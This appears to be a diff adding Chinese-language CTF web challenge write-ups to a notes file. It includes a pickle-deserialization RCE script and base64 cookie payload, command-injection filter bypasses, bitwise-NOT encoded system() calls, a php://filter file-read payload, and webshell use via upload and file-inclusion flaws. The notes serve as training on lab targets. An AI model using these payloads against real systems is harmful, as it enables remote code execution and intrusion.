@@ -1303,3 +1303,477 @@ dirsearch扫描发先dom.php
 
 ------
 
+### unpickle
+
+打开实例，显示hello guest
+
+![image-20240222140640967](image/image-20240222140640967.png)
+
+提供了一个附件，我们打开查看
+
+```python
+# 导入pickle模块，用于序列化和反序列化对象
+import pickle
+# 导入base64模块，用于对数据进行编码和解码
+import base64
+# 导入Flask框架，用于创建Web应用程序
+# 导入request模块，用于处理HTTP请求
+from flask import Flask, request
+
+app = Flask(__name__)
+
+
+@app.route("/")
+def index():
+    # 从请求的cookies中获取base64编码的用户信息
+    try:
+        user = base64.b64decode(request.cookies.get('user'))
+        # 将base64解码后的用户信息进行pickle反序列化
+        user = pickle.loads(user)
+        return user
+    except:
+        # 如果解码或反序列化失败，则默认用户名为"Guest"
+        username = "Guest"
+
+    # 返回带有用户名的字符串
+    return "Hello %s" % username
+
+
+if __name__ == "__main__":
+    # 运行Flask应用，指定主机和端口
+    app.run(host="0.0.0.0", port=8080)
+
+```
+
+我将注释一并写入
+
+首先看一下index函数，里面进行了一个对异常的处理
+
+尝试（try）从请求（request）中的cookie获取（get）user
+
+并将得到的user进行base64解码（base64.b64decode）
+
+再将解码后的user进行反序列化（pickle.loads）
+
+如果可以解码和反序列化，则返回解码和反序列化后的user（return user）
+
+如果解码和反序列化失败（except:），则默认名为guest（username = "Guest"）
+
+所以我们要在cookie中传入一个user，他的值是经过序列化和base64编码的
+
+#### 方法一：python直接请求打印
+
+构建payload
+
+```python
+import requests
+import pickle
+import base64
+
+
+class Exp(object):
+    def __reduce__(self):
+        # 利用os.popen查询
+        a = '__import__("os").popen("ls").read()'
+        return eval, (a,)  # 利用os.popen查询
+
+
+e = Exp()
+s = pickle.dumps(e)  # 将获取的对象序列化
+print(s)
+user = base64.b64encode(s).decode()  # 将序列化的对象使用base64加密
+print(user)  # 输出加密后的序列化对象
+
+response = requests.get("http://3dfa7d8f-8a8f-4417-83d0-a141d5a445f4.www.polarctf.com:8090/", cookies=dict(
+    user=base64.b64encode(s).decode()
+))
+print(response.content)
+
+```
+
+具体思路就是：
+
+导入requests、pickle和base64模块。
+定义了一个名为Exp的类。
+在Exp类中，定义了一个名为`__reduce__`的特殊方法，用于在对象被序列化时返回对象的还原方法。
+在`__reduce__`方法中，使用os.popen查询文件内容。
+创建一个Exp对象e。
+使用pickle.dumps将对象e序列化为字符串s。
+打印序列化后的字符串s。
+使用base64.b64encode将序列化后的字符串s进行base64加密，并将结果解码为字符串user。
+打印加密后的字符串user。
+使用requests.get发送一个GET请求到指定的URL，并将加密后的字符串user作为cookies参数传递。
+打印响应的内容。
+
+先使用os.popen('ls')查看文件目录，发现本级目录下没有flag文件
+
+![image-20240222151303751](image/image-20240222151303751.png)
+
+查看一下根目录os.popen('ls /')
+
+![image-20240222151319262](image/image-20240222151319262.png)
+
+发现flag，os.popen('cat /flag')
+
+![image-20240222151354975](image/image-20240222151354975.png)
+
+得到flag
+
+方法二：浏览器构造cookie
+
+将反序列化base64加密后的值，通过浏览器直接传入cookie
+
+```
+gASVRgAAAAAAAACMCGJ1aWx0aW5zlIwEZXZhbJSTlIwqX19pbXBvcnRfXygib3MiKS5wb3BlbigiY2F0IC9mbGFnIikucmVhZCgplIWUUpQu
+```
+
+![image-20240222151728971](image/image-20240222151728971.png)
+
+***
+
+### blackmagic
+
+打开实例
+
+![image-20240222152926283](image/image-20240222152926283.png)
+
+点进链接
+
+在源码中发现提示
+
+```php
+<?php
+// 提取$_REQUEST中的数据
+extract($_REQUEST);
+
+// 定义特殊字符列表
+$strCharList = "\r\n\0\x0B ";
+
+// 定义flag的格式
+$strFlag = "\r 	xxxxx...xxxxx	 \n";
+
+// 如果存在$strTmp变量
+if(isset($strTmp))
+{
+    // 去除$strFlag中的特殊字符
+    $strContent = trim($strFlag, $strCharList);
+    
+    // 如果$strTmp等于$strContent
+    if($strTmp == $strContent)
+    {
+        // 输出flag{xxx...xxx}
+        echo "flag{xxx...xxx}";
+    }
+    else
+    {
+        // 输出You're awesome, but not enough.
+        echo "You're awesome, but not enough.";
+    }
+}
+else
+{
+    // 输出I will never tell you the flag is inside!
+    echo "I will never tell you the flag is inside!";
+}
+?>
+
+```
+
+提取请求数据： 使用extract($_REQUEST);函数从$_REQUEST全局数组中提取所有变量并将其赋值给当前作用域中的相应变量。$_REQUEST包含了GET、POST和COOKIE中的变量，这意味着如果请求中包含名为strTmp的变量，它将被自动创建并赋值。
+
+定义特殊字符列表： 变量$strCharList存储了一串特殊字符，包括回车符、换行符、空字节和垂直制表符。这些字符在后续步骤中用于清理字符串。
+
+定义flag格式： 变量$strFlag定义了一个带格式的字符串，其中包含实际flag信息的部分用"xxxxx...xxxxx"表示，前后分别有回车、水平制表符等空白字符。
+
+条件判断及处理：
+存在$strTmp变量时：
+
+使用trim()函数去除$strFlag字符串两侧在$strCharList中指定的特殊字符，得到清理后的字符串$strContent。
+
+然后检查清理后的$strTmp是否等于$strContent。
+如果相等，则输出格式化的flag消息，即flag{xxx...xxx}（这里假设xxx...xxx代表真实的flag内容）。
+若不相等，则输出提示信息You're awesome, but not enough.，可能表示用户提供的输入未达到获取flag的要求。
+不存在$strTmp变量时： 输出提示信息I will never tell you the flag is inside!，这通常意味着没有提供必要的输入或验证失败。
+
+这里我们发现没有去掉制表符
+
+```php
+$strCharList = "\r\n\0\x0B "
+```
+
+又要使`$strTmp == $strContent`,构建payload
+
+```
+?strTmp=%09xxxxx...xxxxx%09
+```
+
+得到flag
+
+![image-20240222154155087](image/image-20240222154155087.png)
+
+***
+
+### *反序列化
+
+
+
+
+
+***
+
+找找shell
+
+下载附件
+
+发现加密
+
+![image-20240222160147685](image/image-20240222160147685.png)
+
+
+分析可能是php混淆加密，https://www.toolfk.com/tools/convert-php.html![image-20240222160032096](image/image-20240222160032096.png)
+
+发现是一句话木马，密码是usam
+
+御剑扫描一下后台
+
+![image-20240222160814318](image/image-20240222160814318.png)
+
+发现shell.php,尝试利用蚁剑链接
+
+![image-20240222160858147](image/image-20240222160858147.png)
+
+得到flag
+
+![image-20240222160919121](image/image-20240222160919121.png)
+
+***
+
+### 再ping一波啊
+
+首先ping一个127.0.0.1试一下
+
+![image-20240222161254438](image/image-20240222161254438.png)
+
+构建`127.0.0.1|ls`试一下
+
+发现ls被过滤，l\s试一下
+
+![image-20240222161445580](image/image-20240222161445580.png)
+
+说明\绕过存在
+
+试一下l\s /
+
+发现不行，推测是空格被过滤，尝试空格绕过,利用index进行测试
+
+```
+ca\t$IFSindex.php
+```
+
+![image-20240222161820247](image/image-20240222161820247.png)
+
+发现识别了cat和空格指令，说明$IFS空格绕过存在
+
+但是不让我们读取index.php
+
+想办法绕过，这里我们使用拼接绕过
+
+构建payload
+
+```
+127.0.0.1;a=in;b=dex.php;ca\t$IFS$a$b
+```
+
+![image-20240222163349855](image/image-20240222163349855.png)
+
+得到index的源码，可以看到过滤了很多，f12看一下是否有线索
+
+![image-20240222163623908](image/image-20240222163623908.png)
+
+发现flag
+
+***
+
+### wu
+
+打开实例
+
+![image-20240222163726525](image/image-20240222163726525.png)
+
+典型的无数字字母rce
+
+取反绕过
+
+```php
+<?php
+echo urlencode(~'system').'   ';					# %8C%86%8C%8B%9A%92
+echo urlencode(~'ls').'   ';
+# %93%8C
+```
+
+对得到的结果再次取反构建payload：
+
+```
+?a=(~%8C%86%8C%8B%9A%92)((~%93%8C));
+```
+
+![image-20240222195915176](image/image-20240222195915176.png)
+
+得到目录
+
+再次构建，
+
+```php
+echo urlencode(~'cat zheshiflag.php')；
+# %9C%9E%8B%DF%85%97%9A%8C%97%96%99%93%9E%98%D1%8F%97%8F
+```
+
+再次构建，得到flag
+
+```
+?a=(~%8C%86%8C%8B%9A%92)((~%9C%9E%8B%DF%85%97%9A%8C%97%96%99%93%9E%98%D1%8F%97%8F));
+```
+
+![image-20240222200353810](image/image-20240222200353810.png)
+
+***
+
+### 代码审计1
+
+![image-20240222201410597](image/image-20240222201410597.png)
+
+打开实例，代码审计，发现代码`echo new $sys($xsx);`
+
+php中内置很多原生的类，在CTF中常以echo new $a($b);这种形式出现，当看到这种关键字眼时，就要考虑本题是不是需要原生类利用了。
+
+这里考察的是文件读取，所以调用的原生类是SplFileObject
+
+当用文件目录遍历到了敏感文件时，可以用SplFileObject类，同样
+
+通过echo触发SplFileObject中的__toString()方法。(该类不支持通
+
+配符，所以必须先获取到**完整文件名称**才行)
+
+除此之外其实SplFileObject类，只能读取文件的第一行内容，如果
+
+想要全部读取就需要用到foreach函数，但若题目中没有给出
+
+foreach函数的话，就要用伪协议读取文件的内容。
+
+构建payload
+
+```
+?sys=SplFileObject&xsx=php://filter/convert.base64-encode/resource=flag.php
+```
+
+![image-20240222202045820](image/image-20240222202045820.png)
+
+得到base64加密后的内容，解码得到flag
+
+![image-20240222202129867](image/image-20240222202129867.png)
+
+***
+
+### 你的马呢？
+
+先进行简单的上传，
+
+![image-20240222204148424](image/image-20240222204148424.png)
+
+发现会返回后缀，猜测是双重后缀绕过
+
+改文件名为webshell.php.gif再次上传
+
+![image-20240222204400909](image/image-20240222204400909.png)
+
+上传成功，访问webshell，剑蚁利用密码shell链接
+
+![image-20240222204502207](image/image-20240222204502207.png)
+
+在根目录发现flag，打开得到flag
+
+![image-20240222204525463](image/image-20240222204525463.png)
+
+***
+
+### ezphp
+
+打开实例，提示已经暴露给爬虫，联想到robots.txt
+
+![image-20240223141035057](image/image-20240223141035057.png)
+
+进去发现三个网站先进入file看一下
+
+![image-20240223141124640](image/image-20240223141124640.png)
+
+发现一个文件包含漏洞
+
+upload应该就是文件上传
+
+那么这题就是文件上传结合文件包含漏洞
+
+将一句话木马插入到图片当中，利用上传功能将图片上传到服务器，再通过本地包含漏洞将文件解析执行
+
+那么我们上传一句话木马
+
+![image-20240223142436595](image/image-20240223142436595.png)
+
+![image-20240223142516944](image/image-20240223142516944.png)
+
+找到文件地址，构造文件包含
+
+![image-20240223142548097](image/image-20240223142548097.png)
+
+post传入命令进行查找flag，或者蚁剑链接进行查找
+
+```
+123=system('find / -name flag');
+```
+
+![image-20240223143215855](image/image-20240223143215855.png)
+
+得到位置，读取得到flag
+
+![image-20240223143253802](image/image-20240223143253802.png)
+
+### *随机值
+
+
+
+
+
+***
+
+### phpurl
+
+打开附件，发现提示
+
+![image-20240223150340763](image/image-20240223150340763.png)
+
+发现加密编码aW5kZXgucGhwcw，疑似base
+
+放入厨子中进行解码（补全==）
+
+![image-20240223150455318](image/image-20240223150455318.png)
+
+同样御剑扫描也可以扫描出来
+
+![image-20240223150556332](image/image-20240223150556332.png)
+
+发现备份文件，进行解读
+
+首先get传入的sys不能等于xxs
+
+然后传入的sys经过一次url解码，在判断是否解码后的sys等于xxs
+
+由于参数传入的时候会进行url编码，所以我们要进行两次url编码才能绕过第一层
+
+另外因为是备份文件，所以传参要在index.php中进行
+
+![image-20240223151042226](image/image-20240223151042226.png)
+
+执行得到flag
+
+***
+
+## 困难部分
